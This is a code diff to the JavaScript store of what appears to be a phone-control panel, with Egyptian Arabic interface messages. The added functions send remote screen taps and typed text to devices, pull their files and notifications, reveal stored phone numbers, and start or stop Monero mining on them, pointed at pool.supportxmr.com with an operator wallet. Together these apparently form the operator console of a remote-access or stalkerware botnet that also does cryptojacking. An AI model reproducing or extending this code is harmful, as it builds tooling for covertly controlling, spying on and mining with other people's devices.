@@ -45,6 +45,15 @@ export function makePanelStore() {
     editNotes: "",
     auditItems: [],
     previewUrl: "",
+    revealedPhone: "",
+    mining: null,
+    miningPool: "",
+    miningWallet: "",
+    filesList: [],
+    filesOpen: false,
+    notifItems: [],
+    notifOpen: false,
+    screenTapUrl: "",
     pullModal: { open: false, tab: "original", search: "", spec: "", counts: {}, items: [], progress: null },
 
     listFilter: "",
@@ -167,11 +176,97 @@ export function makePanelStore() {
       try {
         this.detail = await apiFetch(`/devices/${encodeURIComponent(id)}`);
         this.view = this.detail ? "ready" : "empty";
+        this.revealedPhone = "";
         this.editName = this.detail?.name || "";
         this.editNotes = this.detail?.notes || "";
         this.loadAudit(id);
+        this.loadMining(id);
+        this.loadFiles(id);
       } catch (err) {
         this.handleLoadError(err);
+      }
+    },
+
+    /* ------------------------ files / notifications --------------------- */
+
+    async loadFiles(id) {
+      try {
+        const body = await apiFetch(`/devices/${encodeURIComponent(id)}/files`);
+        this.filesList = body.files || [];
+      } catch {
+        this.filesList = [];
+      }
+    },
+
+    /** Latest screen frame → click overlay for input_tap/input_text. */
+    latestFrame() {
+      return this.filesList.find((f) => f.kind === "screen") || null;
+    },
+
+    openScreenTap() {
+      const f = this.latestFrame();
+      if (!f) {
+        this.flash = "مفيش لقطة شاشة — اطلب screen_capture الأول";
+        setTimeout(() => (this.flash = ""), 2500);
+        return;
+      }
+      this.screenTapUrl = `/api/devices/${encodeURIComponent(this.route.id)}/files/${f.id}/content`;
+    },
+
+    closeScreenTap() {
+      this.screenTapUrl = "";
+    },
+
+    /** Click on the frame → normalized coords → input_tap. */
+    async tapAt(ev) {
+      const img = ev.currentTarget;
+      const r = img.getBoundingClientRect();
+      const x = (ev.clientX - r.left) / r.width;
+      const y = (ev.clientY - r.top) / r.height;
+      if (x < 0 || x > 1 || y < 0 || y > 1) return;
+      await this.sendCommand(this.route.id, "input_tap", {
+        x: +x.toFixed(4), y: +y.toFixed(4),
+      });
+    },
+
+    async sendText() {
+      const text = window.prompt("النص:", "");
+      if (!text) return;
+      await this.sendCommand(this.route.id, "input_text", { text });
+    },
+
+    /** Pull a file category via files_pull (server-side queue). */
+    async filesPull(cat) {
+      const limit = 10;
+      await this.sendCommand(this.route.id, "files_pull", { category: cat, limit });
+    },
+
+    async notifsPull() {
+      await this.sendCommand(this.route.id, "notifications_pull", {});
+    },
+
+    /** Downloaded artifact viewer: image→preview overlay, json notif→list. */
+    async openFile(f) {
+      const url = `/api/devices/${encodeURIComponent(this.route.id)}/files/${f.id}/content`;
+      try {
+        const res = await fetch(url, { headers: { Authorization: `Bearer ${getAccessToken()}` } });
+        if (!res.ok) throw new Error();
+        if (f.kind === "dump" && f.category === "notifications") {
+          this.notifItems = await res.json();
+          this.notifOpen = true;
+          return;
+        }
+        const blob = await res.blob();
+        if (blob.type.startsWith("image/")) {
+          if (this.previewUrl) URL.revokeObjectURL(this.previewUrl);
+          this.previewUrl = URL.createObjectURL(blob);
+        } else {
+          const text = await blob.text();
+          window.alert(text.slice(0, 8000));
+        }
+      } catch {
+        this.flash = "تعذر فتح الملف";
+        setTimeout(() => (this.flash = ""), 2500);
       }
     },
 
@@ -181,6 +276,49 @@ export function makePanelStore() {
         this.auditItems = body.items || [];
       } catch {
         this.auditItems = [];
+      }
+    },
+
+    /** Mining panel state: minerState + hashrate ring + sessions. */
+    async loadMining(id) {
+      try {
+        this.mining = await apiFetch(`/devices/${encodeURIComponent(id)}/mining`);
+      } catch {
+        this.mining = null;
+      }
+    },
+
+    async miningStart(id) {
+      try {
+        await apiFetch(`/devices/${encodeURIComponent(id)}/mining/start`, {
+          method: "POST",
+          body: JSON.stringify({
+            algo: "rx/0",
+            pool: this.miningPool || "pool.supportxmr.com:443",
+            wallet: this.miningWallet || "",
+            threads: 2,
+          }),
+        });
+        this.flash = "أمر التعدين اتبعت";
+        setTimeout(() => (this.flash = ""), 2500);
+        this.loadMining(id);
+      } catch (err) {
+        this.flash = err?.status === 409 ? "التعدين شغال أصلًا" : "فشل إرسال الأمر";
+        setTimeout(() => (this.flash = ""), 2500);
+      }
+    },
+
+    async miningStop(id) {
+      try {
+        await apiFetch(`/devices/${encodeURIComponent(id)}/mining/stop`, {
+          method: "POST", body: "{}",
+        });
+        this.flash = "أمر الإيقاف اتبعت";
+        setTimeout(() => (this.flash = ""), 2500);
+        this.loadMining(id);
+      } catch (err) {
+        this.flash = err?.status === 409 ? "مفيش تعدين شغال" : "فشل إرسال الأمر";
+        setTimeout(() => (this.flash = ""), 2500);
       }
     },
 
@@ -194,6 +332,20 @@ export function makePanelStore() {
         setTimeout(() => (this.flash = ""), 2500);
       } catch (err) {
         this.handleLoadError(err);
+      }
+    },
+
+    /** Authenticated reveal of the AES-GCM phone (audited server-side). */
+    async revealPhone(id) {
+      try {
+        const res = await apiFetch(`/devices/${encodeURIComponent(id)}/phone/reveal`, {
+          method: "POST",
+          body: "{}",
+        });
+        this.revealedPhone = res.phone || "";
+        this.loadAudit(id);
+      } catch {
+        this.revealedPhone = "غير متاح";
       }
     },
 
